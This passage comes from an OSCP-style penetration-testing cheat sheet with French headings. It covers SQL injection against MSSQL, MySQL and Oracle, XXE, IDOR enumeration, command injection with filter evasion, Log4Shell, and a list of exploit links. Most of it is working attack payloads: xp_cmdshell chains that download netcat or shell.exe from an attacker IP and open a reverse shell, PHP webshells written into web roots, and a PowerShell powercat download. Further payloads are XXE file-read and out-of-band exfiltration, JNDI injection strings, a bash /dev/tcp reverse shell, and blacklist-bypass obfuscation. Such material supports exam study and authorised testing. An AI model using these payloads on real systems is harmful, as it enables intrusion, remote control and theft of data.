```sql
-- Attacker
sudo responder -A -I tun0

-- Target
EXEC master..xp_dirtree '\\[Attacker_IP]\share\'
```


##### Statement Examples


Commande `--` pour la rubrique « Statement Examples ».

```sql
-- Visualize SQL statement and adjust payload
INSERT INTO dbo.tablename ('<user_input>', '<user_input>'); 

-- Adjust initial payloads
INSERT INTO dbo.tablename ('1 AND 1=CONVERT(INT,@@version))-- ', '<user_input>'); 
INSERT INTO dbo.tablename('', CONVERT(INT, db_name(<number>)))-- 

-- Enumerate column names
', CONVERT(INT, (CHAR(58)+(SELECT DISTINCT TOP 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='<table_name>' ORDER BY column_name ASC)+CHAR(58))))-- 

-- Enumerate data in columns
', CONVERT(INT, (CHAR(58)+CHAR(58)+(SELECT TOP 1 <column> FROM <table_name> ORDER BY <column> ASC)+CHAR(58)+CHAR(58))))-- 
```


##### Remote Code Execution (RCE)


Commande `--` pour la rubrique « Remote Code Execution (RCE) ».

```sql
-- Use this if you are doing SQL Injection.

-- Enable advanced options
';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- 

-- Enable command shell
';EXEC xp_cmdshell "powershell wget http://[kali_ip]/nc64.exe -o C:\Users\Public\nc64.exe";--

-- Execute commands
';EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe [kali_ip] [listening_port]";--
```


Commande `--` pour la rubrique « Remote Code Execution (RCE) ».

```sql
-- Use this if you have direct access to execute SQL statements.

-- Enable advanced options
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;

-- Enable command shell
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell "powershell wget http://[kali_ip]/nc64.exe -o C:\Users\Public\nc64.exe";
EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe [kali_ip] [listening_port]";
```


Commande `--` pour la rubrique « Remote Code Execution (RCE) ».

```sql
-- Exploitation Example.

-- Enable advanced options
<username>'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --

-- Enable command shell
<username>'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --

-- Execute commands
<username>'; EXEC master.dbo.xp_cmdshell 'ping <attacker_ip>'; --
<username>'; EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<attacker_ip>:<port>/shell.exe C:\\Windows\\temp\\shell.exe'; --
<username>'; EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\shell.exe'; --
```


##### Impersonation


Commande `select` pour la rubrique « Impersonation ».

```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```


Commande `execute` pour la rubrique « Impersonation ».

```sql
EXECUTE AS LOGIN = 'sa' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
```


Commande `select` pour la rubrique « Impersonation ».

```sql
SELECT SYSTEM_USER

SELECT IS_SRVROLEMEMBER('sysadmin')

go
```


Commande `select` pour la rubrique « Impersonation ».

```sql
SELECT srvname, isremote FROM sysservers;
```


**Paramètres et repères :**
`xp_cmdshell`  


Commande `exec` pour la rubrique « Impersonation ».

```sql
EXEC master.dbo.sp_configure 'show advanced options', 1;

RECONFIGURE;
```


#### MySQL

Examiner les connexions, la configuration et les requêtes de la base de données.


##### Default Databases


**Paramètres et repères :**
`mysql` · `information_schema` · `performance_schema` · `sys`  


##### Commandes courantes


Commande `mysql` pour la rubrique « Commandes courantes ».

```bash
mysql -u <username> -p'<password>' -h <host> -P <port>
```


Commande `show` pour la rubrique « Commandes courantes ».

```sql
SHOW DATABASES;

USE <database_name>;
```


Commande `show` pour la rubrique « Commandes courantes ».

```sql
SHOW TABLES;

DESCRIBE <table_name>;

SELECT * FROM <table_name>;
```


Commande `select` pour la rubrique « Commandes courantes ».

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
-- or, using the ?cmd=[command] format
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
```


Commande `--` pour la rubrique « Commandes courantes ».

```sql
-- Check MySQL version
SELECT version();

-- Get system user
SELECT system_user();

-- List databases
SHOW DATABASES;

-- List users and their passwords (authentication_string)
SELECT user, authentication_string FROM mysql.user WHERE user = '<username>';

-- Database User Enumeration
SELECT user FROM mysql.user;

-- Privilege Escalation
GRANT ALL PRIVILEGES ON *.* TO '<username>'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;

# Test SQLi in every input field
';#---
```


##### Remote Code Execution (RCE)


**Paramètres et repères :**
`mysql`  


Commande `--` pour la rubrique « Remote Code Execution (RCE) ».

```sql
-- General payload
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"

-- Using UNION
' union select '<?php system($_GET["cmd"]); ?>' into outfile '/srv/http/shell.php' -- -

-- Windows Payload
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "C:/wamp/www/shell.php" 
```


##### Commandes courantes


Commande `admin` pour la rubrique « Commandes courantes ».

```sql
admin ' OR 1=1 -- 
```


Commande `1` pour la rubrique « Commandes courantes ».

```sql
1' OR 1 = 1 #
```


Exemple technique pour la rubrique « Commandes courantes ».

```sql
' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema=database()-- 
```


Exemple technique pour la rubrique « Commandes courantes ».

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- 
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='<table_name>'-- 
```


Exemple technique pour la rubrique « Commandes courantes ».

```sql
' UNION SELECT <column1>, <column2> FROM <table_name>-- 
```


##### Commandes courantes


**Paramètres et repères :**
`dual`  


Exemple technique pour la rubrique « Commandes courantes ».

```sql
' UNION SELECT 1,2,3,4,5 FROM dual-- 
```


Exemple technique pour la rubrique « Commandes courantes ».

```sql
' UNION SELECT 1,2,3 FROM dual-- 
```


Exemple technique pour la rubrique « Commandes courantes ».

```sql
' UNION SELECT username, NULL, NULL FROM all_users-- 
```


Exemple technique pour la rubrique « Commandes courantes ».

```sql
' UNION SELECT table_name, NULL, NULL FROM all_tables-- 
' UNION SELECT column_name, NULL, NULL FROM all_tab_columns WHERE table_name='<table_name>'-- 
```


Exemple technique pour la rubrique « Commandes courantes ».

```sql
' UNION SELECT <column_name>, NULL FROM <table_name>-- 
```


##### Login Bypass


Commande `admin` pour la rubrique « Login Bypass ».

```sql
admin ' OR 1=1 -- 
```


##### Union-Based Injection (Dump Creds)

Examiner les entrées et les réponses de l'application web.


## Injection XXE

Examiner les entrées et les réponses de l'application web.


### Identifying


**Tag**


Exemple technique pour la rubrique « Identifying ».

```text
<date>
```


**Entity**


Exemple technique pour la rubrique « Identifying ».

```text
&lt;
```


**Element**


Exemple technique pour la rubrique « Identifying ».

```text
<date>01-01-2022</date>
```


**Attribute**


Commande `version` pour la rubrique « Identifying ».

```text
version="1.0"/encoding="UTF-8"
```


**Declaration**


Exemple technique pour la rubrique « Identifying ».

```text
<?xml version="1.0" encoding="UTF-8"?>
```


### Local File Disclosure


Exemple technique pour la rubrique « Local File Disclosure ».

```text
&[variable];
```

![XEE Payload](https://www.emmanuelsolis.com/img/xee01.png)

![XEE Result](https://www.emmanuelsolis.com/img/xee02.png)


### Reading Sensitive Files

![XEE Reading Sensitive Files](https://www.emmanuelsolis.com/img/xee03.png)


**Paramètres et repères :**
`/etc/passwd`  


Exemple technique pour la rubrique « Reading Sensitive Files ».

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```


Exemple technique pour la rubrique « Reading Sensitive Files ».

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
   <!ELEMENT config ANY >
   <!ENTITY readConfig SYSTEM "file:///etc/myconfig.conf" >]>
<config>&readConfig;</config>
```


Exemple technique pour la rubrique « Reading Sensitive Files ».

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY localHosts SYSTEM "file:///etc/hosts" >]>
<data>&localHosts;</data>
```


Exemple technique pour la rubrique « Reading Sensitive Files ».

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE request [
   <!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd">
   <!ENTITY % all "<!ENTITY send SYSTEM 'file:///etc/passwd'>">
   %remote;
   %all;
]>
<request>&send;</request>
```


Exemple technique pour la rubrique « Reading Sensitive Files ».

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE request [
   <!ELEMENT request ANY >
   <!ENTITY xxe SYSTEM "http://attacker.com/secret.txt" >]>
<request>&xxe;</request>
```


### Reading Code source


Exemple technique pour la rubrique « Reading Code source ».

```text
| < > { } &
```


Exemple technique pour la rubrique « Reading Code source ».

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

![XEE Reading Source Code](https://www.emmanuelsolis.com/img/xee04.png)


### Remote Code Execution


Exemple technique pour la rubrique « Remote Code Execution ».

```text
| < > { } &
```


Exemple technique pour la rubrique « Remote Code Execution ».

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```


### Énumération


Exemple technique pour la rubrique « Énumération ».

```bash
# UID=1
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf

# UID=2
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```


Commande `url` pour la rubrique « Énumération ».

```bash
# Script with regex to find the documents
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```


Commande `url` pour la rubrique « Énumération ».

```bash
# Alternative script option to find any extension
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..20}; do
    for link in $(curl -s -X POST -d "uid=$i" "$url/documents.php" | grep -oP "\/documents.*?\\.\\w+"); do
        curl -O $url/$link
    done
done
```


### AJAX Calls


Commande `function` pour la rubrique « AJAX Calls ».

```javascript
// Code Example
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```


### Hashing & Encoding

Vérifier les comptes, les secrets et les mécanismes d'authentification.


Commande `download.php` pour la rubrique « Hashing & Encoding ».

```text
download.php?filename=ZmlsZV8xMjMucGRm
```


Commande `download.php` pour la rubrique « Hashing & Encoding ».

```text
download.php?filename=c81e728d9d4c2f636f067f89cc14862c
```


Exemple technique pour la rubrique « Hashing & Encoding ».

```javascript
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```


### Compare User Roles


**Paramètres et repères :**
`User2`  


Exemple technique pour la rubrique « Compare User Roles ».

```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"
}
```


### Insecure APIs


Exemple technique pour la rubrique « Insecure APIs ».

```json
{
    "uid": 1,
    "uuid": "40f5888b67c246df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "emma LastName",
    "email": "emma@employees.com",
    "about": "A pentester and red teamer."
}
```


## Injections de commandes

Examiner les entrées et les réponses de l'application web.


### Identifying


Exemple technique pour la rubrique « Identifying ».

```powershell
# Check if we are executing PowerShell or CMD
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```


Exemple technique pour la rubrique « Identifying ».

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>

app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```


Récupérer une ressource distante ou une réponse HTTP.

```bash
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<ATTACKER_IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<ATTACKER_IP>%20-p%20<PORT>%20-e%20powershell' http://<TARGET>:<PORT>/archive
```


### Command Methods


Exemple technique pour la rubrique « Command Methods ».

```text
;
```


**Semicolon**


Exemple technique pour la rubrique « Command Methods ».

```text
;
```


Exemple technique pour la rubrique « Command Methods ».

```text
%3b
```


**New Line**


Exemple technique pour la rubrique « Command Methods ».

```text
%0a
```


**Background**


Exemple technique pour la rubrique « Command Methods ».

```text
&
```


Exemple technique pour la rubrique « Command Methods ».

```text
%26
```


**Pipe**


Exemple technique pour la rubrique « Command Methods ».

```text
|
```


Exemple technique pour la rubrique « Command Methods ».

```text
%7c
```


**AND**


Exemple technique pour la rubrique « Command Methods ».

```text
&&
```


Exemple technique pour la rubrique « Command Methods ».

```text
%26%26
```


**OR**


Exemple technique pour la rubrique « Command Methods ».

```text
|
```


Exemple technique pour la rubrique « Command Methods ».

```text
%7c%7c
```


**Sub-Shell**


Exemple technique pour la rubrique « Command Methods ».

```text
%60%60
```


**Sub-Shell**


Exemple technique pour la rubrique « Command Methods ».

```text
$()
```


Exemple technique pour la rubrique « Command Methods ».

```text
%24%28%29
```


#### Space is Blacklisted


Exemple technique pour la rubrique « Space is Blacklisted ».

```text
%09
```


Exemple technique pour la rubrique « Space is Blacklisted ».

```text
$IFS
```


Exemple technique pour la rubrique « Space is Blacklisted ».

```json
{ls,-la}
```


#### / or \ are Blacklisted


Commande `echo` pour la rubrique « / or \ are Blacklisted ».

```bash
# to select /
echo ${PATH:0:1}
```


Exemple technique pour la rubrique « / or \ are Blacklisted ».

```powershell
# to select \
$env:HOMEPATH[0]
```


#### Commandes are Blacklisted


Exemple technique pour la rubrique « Commandes are Blacklisted ».

```javascript
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```


Exemple technique pour la rubrique « Commandes are Blacklisted ».

```text
` or "

Example: w'h'o'am'i
```


Exemple technique pour la rubrique « Commandes are Blacklisted ».

```text
\
```


Exemple technique pour la rubrique « Commandes are Blacklisted ».

```text
$@
```


Commande `examples` pour la rubrique « Commandes are Blacklisted ».

```text
Examples:
- who$@ami
- w\ho\am\i
```


Exemple technique pour la rubrique « Commandes are Blacklisted ».

```text
^
```


Commande `example` pour la rubrique « Commandes are Blacklisted ».

```text
Example:
- who^ami
```


#### Reverse Commandes


Commande `echo` pour la rubrique « Reverse Commandes ».

```bash
# Linux
echo 'whoami' | rev

# To execute:
$(rev<<<'imaohw')
```


Exemple technique pour la rubrique « Reverse Commandes ».

```powershell
# Windows
"whoami"[-1..-20] -join ''

# To execute:
iex "$('imaohw'[-1..-20] -join '')"
```


#### Encoded Commandes


Commande `echo` pour la rubrique « Encoded Commandes ».

```bash
# Linux
echo -n 'cat /etc/passwd | grep 33' | base64

# To execute (note that we are using <<< to avoid using a pipe |, which is a filtered character):
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```


Exemple technique pour la rubrique « Encoded Commandes ».

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

# To execute:
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))
```


### Automatic Tools


Commande `git` pour la rubrique « Automatic Tools ».

```bash
# Installation
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user

# Usage
cd ./bashfuscator/bin/
./bashfuscator -h
./bashfuscator -c 'cat /etc/passwd'

# Example
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```


Commande `git` pour la rubrique « Automatic Tools ».

```powershell
# Installation
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation

# Usage
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt

Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```


## Log4Shell


Exemple technique pour la rubrique « Log4Shell ».

```bash
# LDAP Payload
${jndi:ldap://attacker-server.com:1389/a}

# RMI Payload
${jndi:rmi://attacker-server.com:1099/a}
```


Récupérer une ressource distante ou une réponse HTTP.

```bash
# Using Curl
curl -X GET 'http://target-server.com:8080/?search=${jndi:ldap://attacker-server.com:1389/a}'

# Using Headers Injection
curl -X GET http://target-server.com -H "User-Agent: ${jndi:ldap://attacker-server.com:1389/a}"

# Using POST Data Injection
curl -X POST http://target-server.com/login -d "username=${jndi:ldap://attacker-server.com:1389/a}&password=test"
```


Ouvrir un port d'écoute avec Netcat.

```bash
nc -lvnp [listening_port]
```


Commande `bash` pour la rubrique « Log4Shell ».

```bash
# You can also use a tool like ysoserial (for Windows) to generate the payload.

# Bash reverse shell payload
bash -i >& /dev/tcp/attacker-server.com/[listening_port] 0>&1

# Use the reverse shell payload
${jndi:ldap://attacker-server.com:1389/bash-reverse-shell}
```


## Exploiting CVEs


Commande `cve-2014-6287` pour la rubrique « Exploiting CVEs ».

```text
CVE-2014-6287 https://www.exploit-db.com/exploits/49584 #HFS (HTTP File Server) 2.3.x - Remote Command Execution

CVE-2015-6518 https://www.exploit-db.com/exploits/24044 phpliteadmin <= 1.9.3 Remote PHP Code Injection Vulnerability

CVE-XXXX-XXXX https://www.exploit-db.com/exploits/25971 Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion

CVE-2009-4623 https://www.exploit-db.com/exploits/9623  Advanced comment system1.0  Remote File Inclusion Vulnerability
https://github.com/hupe1980/CVE-2009-4623/blob/main/exploit.py

CVE-2018-18619 https://www.exploit-db.com/exploits/45853 Advanced Comment System 1.0 - SQL Injection
```

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
